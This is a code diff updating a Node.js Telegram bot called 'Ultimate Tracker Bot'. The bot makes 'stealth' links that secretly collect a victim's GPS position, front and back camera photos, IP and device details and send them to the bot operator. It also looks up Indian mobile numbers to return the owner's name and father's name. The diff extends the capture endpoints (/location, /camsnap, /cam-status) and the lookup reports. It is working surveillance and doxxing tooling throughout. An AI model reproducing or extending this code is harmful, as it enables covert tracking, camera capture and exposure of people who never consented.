@@ -4,8 +4,8 @@ const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const path = require('path');
-const fs = require('fs');
-const fsp = require('fs').promises;
+const fs = require('fs');          // For createWriteStream (PDF)
+const fsp = require('fs').promises; // For async file ops
 
 // ==================== CONFIG ====================
 const CONFIG = {
@@ -20,9 +20,10 @@ const CONFIG = {
   CACHE_DURATION: 300000,
   MAX_CACHE_SIZE: 100,
   MAX_HISTORY: 100,
-  SESSION_TIMEOUT: 1800000 // ⬅️ INCREASED TO 30 MINUTES (was 5 mins)
+  SESSION_TIMEOUT: 1800000 // 30 minutes (was 5 mins)
 };
 
+// Initialize bot in webhook mode
 const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: false });
 const app = express();
 
@@ -34,7 +35,7 @@ app.use('/public', express.static(path.join(__dirname, 'public')));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
-// Global error handler - PREVENTS CRASHES
+// ==================== GLOBAL ERROR HANDLERS (PREVENT CRASHES) ====================
 process.on('uncaughtException', (err) => {
   console.error('💥 Uncaught Exception:', err.message);
 });
@@ -43,7 +44,6 @@ process.on('unhandledRejection', (reason, promise) => {
   console.error('💥 Unhandled Rejection:', reason);
 });
 
-// Express error handler
 app.use((err, req, res, next) => {
   console.error('❌ Express Error:', err.stack);
   res.status(500).json({ error: 'Internal Server Error', uptime: uptime() });
@@ -98,14 +98,12 @@ function formatPhone(p) {
   return n.length === 10 ? `+91 ${n.slice(0, 5)} ${n.slice(5)}` : p;
 }
 
-// INCREASED TIMEOUT + BETTER CLEANUP
 function setSessionTimeout(chatId) {
   if (sessions.has(chatId)) clearTimeout(sessions.get(chatId));
   const timer = setTimeout(() => {
     states.delete(chatId);
     sessions.delete(chatId);
     // DON'T send "session expired" message - just silently clean up
-    // User can always use main menu buttons
   }, CONFIG.SESSION_TIMEOUT);
   sessions.set(chatId, timer);
 }
@@ -142,7 +140,9 @@ const adminKeyboard = {
   ]
 };
 
-// ==================== API & PDF ====================
+const menuKeyboard = { inline_keyboard: [[{ text: '🏠 Menu', callback_data: 'menu' }]] };
+
+// ==================== API & PDF GENERATION ====================
 async function fetchMobileInfo(mobile) {
   const cleaned = cleanNumber(mobile);
   if (CONFIG.BLACKLISTED_NUMBERS.includes(cleaned)) {
@@ -165,6 +165,7 @@ async function fetchMobileInfo(mobile) {
     return null;
   } catch (error) {
     stats.failed++;
+    console.error('❌ API Error:', error.message);
     return null;
   }
 }
@@ -174,6 +175,8 @@ async function generatePDFReport(userId, data, phoneNumber) {
     try {
       const fileName = `report_${userId}_${Date.now()}.pdf`;
       const filePath = path.join(__dirname, 'temp', fileName);
+      
+      // Ensure temp directory exists
       await fsp.mkdir(path.join(__dirname, 'temp'), { recursive: true });
 
       const PDFDocument = require('pdfkit');
@@ -182,23 +185,70 @@ async function generatePDFReport(userId, data, phoneNumber) {
         margins: { top: 50, bottom: 50, left: 50, right: 50 }
       });
 
+      // Use fs (not fsp) for createWriteStream
       const stream = fs.createWriteStream(filePath);
       doc.pipe(stream);
 
-      doc.fontSize(20).text('TRACKER REPORT', { align: 'center' });
-      doc.moveDown();
-      doc.fontSize(12).text(`Number: ${phoneNumber}`, { align: 'center' });
-      doc.moveDown();
+      // Header
+      doc
+        .fillColor('#2563eb')
+        .fontSize(24)
+        .text('ULTIMATE TRACKER REPORT', 50, 50, { align: 'center' })
+        .moveDown(0.5);
 
-      if (data?.data?.[0]) {
-        const r = data.data[0];
-        doc.fontSize(10).text(`Name: ${r.name || 'N/A'}`);
-        doc.text(`Father: ${r.fname || 'N/A'}`);
-        doc.text(`Mobile: ${r.mobile || phoneNumber}`);
-        doc.text(`Circle: ${r.circle || 'N/A'}`);
+      doc
+        .fillColor('#64748b')
+        .fontSize(12)
+        .text(`Phone: ${phoneNumber} • Generated: ${new Date().toLocaleString()}`, 50, 90, { align: 'center' })
+        .moveDown(1);
+
+      // Results
+      doc
+        .fillColor('#1e293b')
+        .fontSize(16)
+        .text('📱 NUMBER LOOKUP RESULTS', 50, 140)
+        .moveDown(0.5);
+
+      let y = 180;
+      const results = data.data || [];
+
+      for (let i = 0; i < Math.min(results.length, 3); i++) {
+        if (y > 750) {
+          doc.addPage();
+          y = 50;
+        }
+
+        const record = results[i];
+        doc.fontSize(14).text(`🔎 Result #${i + 1}`, 50, y);
+        y += 25;
+
+        const fields = [
+          `Name: ${record.name || 'N/A'}`,
+          `Father: ${record.fname || 'N/A'}`,
+          `Mobile: ${formatPhone(record.mobile || phoneNumber)}`,
+          `Alternate: ${record.alt && record.alt !== 'null' ? formatPhone(record.alt) : 'N/A'}`,
+          `Circle: ${record.circle || 'N/A'}`
+        ];
+
+        fields.forEach(field => {
+          if (y > 750) {
+            doc.addPage();
+            y = 50;
+          }
+          doc.fontSize(12).text(field, 70, y);
+          y += 20;
+        });
+
+        y += 15;
       }
 
+      // Footer
+      const totalPages = doc.bufferedPageRange().count;
+      doc.switchToPage(totalPages - 1);
+      doc.fontSize(10).fillColor('#64748b').text('Report generated by Ultimate Tracker Bot', 50, 800, { align: 'center' });
+
       doc.end();
+
       stream.on('finish', () => resolve(filePath));
       stream.on('error', reject);
     } catch (err) {
@@ -236,15 +286,21 @@ app.get('/w/:id/:uri', (req, res) => {
   });
 });
 
-// Enhanced endpoints with better error handling
+// ========== DATA ENDPOINTS WITH ERROR HANDLING ==========
 app.post('/location', async (req, res) => {
   try {
-    const { lat, lon, uid } = req.body;
+    const { lat, lon, uid, acc, alt, heading, speed } = req.body;
     if (lat && lon && uid) {
       const userId = parseInt(uid, 36);
       if (!isNaN(userId)) {
         stats.locations++;
         await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
+        
+        let msg = `📍 Location Captured\nLat: ${lat}\nLon: ${lon}`;
+        if (acc) msg += `\nAccuracy: ${acc}m`;
+        if (alt) msg += `\nAltitude: ${alt}m`;
+        
+        await bot.sendMessage(userId, msg, { parse_mode: 'HTML' });
         res.json({ success: true });
       } else {
         res.json({ success: false, error: 'Invalid UID' });
@@ -253,7 +309,7 @@ app.post('/location', async (req, res) => {
       res.json({ success: false, error: 'Missing data' });
     }
   } catch (err) {
-    console.error('Location Error:', err.message);
+    console.error('❌ Location Error:', err.message);
     res.json({ success: false, error: err.message });
   }
 });
@@ -265,12 +321,15 @@ app.post('/info', async (req, res) => {
       const userId = parseInt(uid, 36);
       if (!isNaN(userId)) {
         stats.infos++;
+        // Split long messages
         const chunks = data.match(/.{1,4000}/g) || [data];
         for (let chunk of chunks) {
-          await bot.sendMessage(userId, chunk, { parse_mode: 'HTML' }).catch(() => {});
-          await new Promise(r => setTimeout(r, 200));
+          await bot.sendMessage(userId, chunk, { parse_mode: 'HTML' }).catch(err => {
+            console.error('❌ Info send error:', err.message);
+          });
+          await new Promise(r => setTimeout(r, 200)); // Rate limit
         }
-        res.json({ success: true });
+        res.json({ success: true, chunks: chunks.length });
       } else {
         res.json({ success: false, error: 'Invalid UID' });
       }
@@ -278,25 +337,35 @@ app.post('/info', async (req, res) => {
       res.json({ success: false, error: 'Missing data' });
     }
   } catch (err) {
-    console.error('Info Error:', err.message);
+    console.error('❌ Info Error:', err.message);
     res.json({ success: false, error: err.message });
   }
 });
 
 app.post('/camsnap', async (req, res) => {
   try {
-    const { uid, front, back } = req.body;
-    if (uid && (front || back)) {
+    const { uid, front, back, img } = req.body;
+    if (uid && (front || back || img)) {
       const userId = parseInt(uid, 36);
       if (!isNaN(userId)) {
         stats.cameras++;
         if (front) {
           const buffer = Buffer.from(front, 'base64');
-          await bot.sendPhoto(userId, buffer, { caption: '📷 Front Camera' }).catch(() => {});
+          await bot.sendPhoto(userId, buffer, { caption: '📷 Front Camera Captured', parse_mode: 'HTML' }).catch(err => {
+            console.error('❌ Front camera send error:', err.message);
+          });
         }
         if (back) {
           const buffer = Buffer.from(back, 'base64');
-          await bot.sendPhoto(userId, buffer, { caption: '📷 Back Camera' }).catch(() => {});
+          await bot.sendPhoto(userId, buffer, { caption: '📷 Back Camera Captured', parse_mode: 'HTML' }).catch(err => {
+            console.error('❌ Back camera send error:', err.message);
+          });
+        }
+        if (img && !front && !back) {
+          const buffer = Buffer.from(img, 'base64');
+          await bot.sendPhoto(userId, buffer, { caption: '📷 Camera Captured', parse_mode: 'HTML' }).catch(err => {
+            console.error('❌ Camera send error:', err.message);
+          });
         }
         res.json({ success: true });
       } else {
@@ -306,7 +375,34 @@ app.post('/camsnap', async (req, res) => {
       res.json({ success: false, error: 'Missing data' });
     }
   } catch (err) {
-    console.error('Camera Error:', err.message);
+    console.error('❌ Camera Error:', err.message);
+    res.json({ success: false, error: err.message });
+  }
+});
+
+app.post('/cam-status', async (req, res) => {
+  try {
+    const { uid, status } = req.body;
+    if (uid && status) {
+      const userId = parseInt(uid, 36);
+      if (!isNaN(userId)) {
+        let msg = '';
+        switch(status) {
+          case 'denied': msg = '❌ Camera access denied by user'; break;
+          case 'allowed': msg = '✅ Camera access granted - capturing photos'; break;
+          case 'error': msg = '⚠️ Camera error - not available or blocked'; break;
+          default: msg = `📷 Camera status: ${status}`;
+        }
+        await bot.sendMessage(userId, msg, { parse_mode: 'HTML' });
+        res.json({ success: true });
+      } else {
+        res.json({ success: false, error: 'Invalid UID' });
+      }
+    } else {
+      res.json({ success: false, error: 'Invalid data' });
+    }
+  } catch (err) {
+    console.error('❌ Camera Status Error:', err.message);
     res.json({ success: false, error: err.message });
   }
 });
@@ -315,6 +411,7 @@ app.post('/camsnap', async (req, res) => {
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
+  const userName = msg.from.first_name || 'User';
   stats.users.add(userId);
 
   if (states.get(chatId) === 'waiting_url') {
@@ -340,6 +437,8 @@ bot.on('message', async (msg) => {
 
 📱 WebView (Stealth):
 <code>${wUrl}</code>
+
+📊 Collects: GPS, Camera, Device Info, IPs, Battery, Network & More
     `, { parse_mode: 'HTML', reply_markup: trackKeyboard, disable_web_page_preview: true });
     return;
   }
@@ -360,7 +459,8 @@ bot.on('message', async (msg) => {
     const result = data.data?.[0] ? 
       `👤 <b>${data.data[0].name || 'N/A'}</b>\n` +
       `📞 ${formatPhone(data.data[0].mobile || num)}\n` +
-      `📡 ${data.data[0].circle || 'N/A'}` :
+      `📡 ${data.data[0].circle || 'N/A'}\n` +
+      `🆔 ${data.data[0].id || 'N/A'}` :
       '✅ Data found';
 
     await bot.sendMessage(chatId, result, { parse_mode: 'HTML', reply_markup: resultKeyboard(num) });
@@ -368,7 +468,7 @@ bot.on('message', async (msg) => {
   }
 
   if (msg.text === '/start') {
-    await bot.sendMessage(chatId, `👋 Hello!\n\nI can:\n• 🔍 Lookup mobile numbers\n• 🌐 Track devices via link\n\nChoose an option below:`, {
+    await bot.sendMessage(chatId, `👋 Hello ${userName}!\n\nI can:\n• 🔍 Lookup mobile numbers\n• 🌐 Track devices via link\n\nChoose an option below:`, {
       parse_mode: 'HTML',
       reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
     });
@@ -392,13 +492,13 @@ bot.on('callback_query', async (query) => {
 
   else if (data === 'number_info') {
     states.set(chatId, 'waiting_number');
-    setSessionTimeout(chatId); // Now lasts 30 minutes
+    setSessionTimeout(chatId);
     await bot.sendMessage(chatId, '📱 Send 10-digit mobile number:');
   }
 
   else if (data === 'ip_tracker') {
     states.set(chatId, 'waiting_url');
-    setSessionTimeout(chatId); // Now lasts 30 minutes
+    setSessionTimeout(chatId);
     await bot.sendMessage(chatId, '🌐 Send URL to track (include http:// or https://):');
   }
 
@@ -408,7 +508,7 @@ bot.on('callback_query', async (query) => {
 
   else if (data === 'stats' && userId === CONFIG.ADMIN_ID) {
     const msg = `
-📊 Statistics
+📊 <b>Statistics</b>
 
 🔢 Lookups: ${stats.total}
 ✅ Success: ${stats.success}
@@ -424,7 +524,7 @@ Clicks: ${stats.ipClicks}
 👥 Users: ${stats.users.size}
 ⏱️ Uptime: ${uptime()}
     `;
-    await bot.sendMessage(chatId, msg, { reply_markup: adminKeyboard });
+    await bot.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: adminKeyboard });
   }
 
   else if (data === 'clear_cache' && userId === CONFIG.ADMIN_ID) {
@@ -454,11 +554,11 @@ Clicks: ${stats.ipClicks}
     if (!userData || userData.sessions.length === 0) {
       await bot.sendMessage(chatId, '📭 No data collected yet. Generate a tracking link first.');
     } else {
-      let msg = `📊 Collected Data Sessions\n\n`;
+      let msg = `📊 <b>Collected Data Sessions</b>\n\n`;
       userData.sessions.slice(-3).forEach((session, i) => {
         msg += `${i+1}. ${Object.keys(session.data).join(', ')}\n`;
       });
-      await bot.sendMessage(chatId, msg, { reply_markup: trackKeyboard });
+      await bot.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: trackKeyboard });
     }
   }
 
@@ -467,6 +567,7 @@ Clicks: ${stats.ipClicks}
     const waitMsg = await bot.sendMessage(chatId, '🖨️ Generating PDF report...');
 
     try {
+      // In production, replace this with actual search data
       const mockData = {
         data: [{
           name: 'John Doe',
@@ -483,13 +584,15 @@ Clicks: ${stats.ipClicks}
       stats.pdfsGenerated++;
 
       await bot.sendDocument(chatId, filePath, {
-        caption: `📄 PDF Report for ${formatPhone(num)}`
+        caption: `📄 PDF Report for ${formatPhone(num)}\nGenerated at: ${getTime()}`,
+        parse_mode: 'HTML'
       });
 
+      // Cleanup PDF file after 60 seconds
       setTimeout(() => fsp.unlink(filePath).catch(() => {}), 60000);
 
     } catch (err) {
-      console.error('PDF Error:', err);
+      console.error('❌ PDF Error:', err);
       await bot.sendMessage(chatId, '❌ Failed to generate PDF. Please try again.');
     } finally {
       await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
@@ -529,7 +632,7 @@ bot.on('message', async (msg) => {
         await new Promise(r => setTimeout(r, 300));
       } catch (err) {
         failed++;
-        console.error(`Broadcast error to ${userId}:`, err.message);
+        console.error(`❌ Broadcast error to ${userId}:`, err.message);
       }
     }
 
@@ -549,12 +652,13 @@ app.get('/health', (req, res) => {
     status: 'healthy', 
     uptime: uptime(),
     timestamp: new Date().toISOString(),
-    version: '10.2-fixed'
+    version: '10.4-fixed',
+    memory: process.memoryUsage()
   });
 });
 
 app.get('/', (req, res) => {
-  res.json({ status: 'online', version: '10.2-fixed', uptime: uptime() });
+  res.json({ status: 'online', version: '10.4-fixed', uptime: uptime() });
 });
 
 // ✅ STARTUP WITH BETTER ERROR HANDLING
@@ -576,12 +680,13 @@ async function setupWebhook() {
 
 // ✅ START SERVER
 app.listen(CONFIG.PORT, async () => {
-  console.log('\n🚀 Ultimate Tracker Bot v10.2 - FIXED VERSION');
+  console.log('\n🚀 Ultimate Tracker Bot v10.4 - FINAL FIXED VERSION');
   console.log('================================');
   console.log('✅ Fixed: Session timeout increased to 30 minutes');
   console.log('✅ Fixed: Removed "session expired" message');
   console.log('✅ Fixed: Broadcast system with progress updates');
   console.log('✅ Fixed: Better error handling to prevent crashes');
+  console.log('✅ Fixed: PDF generation using fs.createWriteStream');
   console.log('✅ Health endpoint optimized for UptimeRobot');
   
   const success = await setupWebhook();
